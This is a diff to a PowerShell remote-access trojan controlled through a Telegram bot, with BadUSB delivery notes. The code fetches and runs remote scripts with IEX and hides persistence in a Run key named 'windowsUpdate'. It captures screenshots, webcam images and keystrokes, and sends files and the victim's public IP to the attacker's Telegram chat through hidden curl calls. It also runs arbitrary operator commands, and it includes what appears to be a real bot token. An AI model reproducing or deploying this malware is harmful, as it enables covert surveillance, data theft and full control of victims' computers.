@@ -1,3 +1,4 @@
+
 <#  
 BADUSB COMMANDS:
     # Execute 
@@ -12,9 +13,17 @@ REGEDIT:
 BOT TELEGRAM:
     https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
 	#>
-	########################################################## Agent Bot Code ##########################################################
+
+
+############
+## CONFIG ##
+############
+
+
+########################################################## Agent Bot Code ##########################################################
+
 function create_agent {param ($botkey,$chat_id)
-$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat_id $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
+$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID;$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
 
 function code_a_base64 {param ($code)
 $ms = New-Object IO.MemoryStream
@@ -34,31 +43,17 @@ $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
 $codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
 return $codeScript
 }
-	
-	
-	
-	
-	
-	
-Function check-command
-{
- Param ($command)
- $antigua_config = $ErrorActionPreference
- $ErrorActionPreference = 'stop'
- try {if(Get-Command $command){RETURN $true}}
- Catch { RETURN $false}
- Finally {$ErrorActionPreference=$antigua_config}
- }
 
-if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃƒÂ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
 
-############
-## CONFIG ##
-############
 
-#//$botkey = '734458093:AAFNojUkBQN1Nbft4fqONRGxctvA0yim7nA'
-#//$chat_id = '611715845'
-$githubScript = 'https://github.com/whobornin1980/bot/blob/master/Functions.ps1'
+
+
+
+
+
+#$botkey = "734458093:AAFNojUkBQN1Nbft4fqONRGxctvA0yim7nA"
+#$bot_Master_ID = '611715845'
+$githubScript = 'https://github.com/whobornin1980/bot/new/master/poc.ps1'
 
 
 ###############
@@ -119,7 +114,7 @@ function backdoor {
         # Check backdoor
         #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
         $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($checkBackdoor)"
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($checkBackdoor)"
 		
         # Backdoor on startup programs
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
@@ -187,35 +182,35 @@ function sendPhoto {
     $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$bot_Master_ID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
     Start-Sleep -Seconds 5
     Send-Message "Deleting.."
     Remove-Item $photo
-    #& $curl -s -X POST "https://api.telegram.org/bot"$botkey"/sendPhoto" -F chat_id=$chat_id -F photo="@$SnapFile"
+    #& $curl -s -X POST "https://api.telegram.org/bot"$botkey"/sendPhoto" -F chat_id=$bot_Master_ID -F photo="@$SnapFile"
 }
 
 function Send-Message($message) {
     $uri = "https://api.telegram.org/bot" + $botkey + "/sendMessage"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F text=' + $message  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$bot_Master_ID" + ' -F text=' + $message  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 }
 
 function ipPublic {
     #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
     $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
-    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($ipPublic)&parse_mode=html"
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($ipPublic)&parse_mode=html"
 }
 
 function download($FileToDownload) {
     $uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $FileToDownload  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$bot_Master_ID" + ' -F document=@' + $FileToDownload  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 
-    #curl -F chat_id="$chat_id" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
+    #curl -F chat_id="$bot_Master_ID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
 }
 
 function keylogger($seconds) {
@@ -315,7 +310,7 @@ function webcam {
     $uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\image.jpg"
     $curl = installCurl
-    $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $photo  + ' -k '
+    $argumenlist = $uri + ' -F chat_id=' + "$bot_Master_ID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
     
     Start-Sleep -Seconds 5
@@ -633,7 +628,7 @@ if($nopreview) { $preview_mode = "True" }
 if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}
 
 $payload = @{
-    "chat_id" = $chat_id;
+    "chat_id" = $bot_Master_ID;
     "text" = $info;
     "parse_mode" = $markdown_mode;
     "disable_web_page_preview" = $preview_mode;
@@ -698,7 +693,7 @@ While ($DoNotExit)  {
 	    #The user wants to run a command
 		$CommandToRun = ($LastMessageText -split ("/select $ipV4 "))[1] #This will remove "run "
 		#$Message = "Ok $($LastMessage.Message.from.first_name), I will try to run the following command on $ipV4 : `n<b>$($CommandToRun)</b>"
-		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($Message)&parse_mode=html"
+		#$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($Message)&parse_mode=html"
 		
 		#Run the command
 		Try {
@@ -711,16 +706,16 @@ While ($DoNotExit)  {
 		}
 		
 		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
-		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($Message)&parse_mode=html"
         $pwd = pwd
         $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
-		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($info)"
+		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($info)"
 	  }
 	  "/stop $ipV4"  {
 		#The user wants to stop the script
 		write-host "The script will end in 5 seconds"
 		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
-		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($ExitMessage)&parse_mode=html"
+		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($ExitMessage)&parse_mode=html"
 		Sleep -seconds 5
 		$DoNotExit = 0
 	  }
@@ -781,7 +776,7 @@ While ($DoNotExit)  {
 	  default  {
 	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
-		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($chat_id)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($botkey)/sendMessage?chat_id=$($bot_Master_ID)&text=$($Message)&parse_mode=html"
 	  }
 	}
 	
